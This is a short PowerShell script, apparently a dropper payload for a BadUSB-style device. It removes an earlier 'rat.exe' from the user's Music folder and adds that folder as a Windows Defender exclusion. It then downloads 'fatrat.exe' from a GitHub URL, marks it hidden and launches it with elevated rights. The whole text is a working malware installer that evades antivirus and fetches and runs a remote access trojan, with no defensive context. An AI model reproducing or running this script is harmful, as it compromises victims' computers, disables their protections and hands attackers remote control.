

$path = Join-Path $env:USERPROFILE "Music\rat.exe"

if (Test-Path $path) {
    Remove-Item $path -Force
    Write-Output "rat.exe deleted."
} else {
    Write-Output "File not found."
}






Add-MpPreference -ExclusionPath "$env:USERPROFILE\Music"
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath

$url = "https://github.com/armanina444/deadly-spark-attiny85/raw/refs/heads/main/fatrat.exe"
$dest = "$env:USERPROFILE\Music\fatrat.exe"

Invoke-WebRequest -Uri $url -OutFile $dest

Set-ItemProperty -Path $dest -Name Attributes -Value Hidden

Start-Process -FilePath $dest -Verb RunAs   
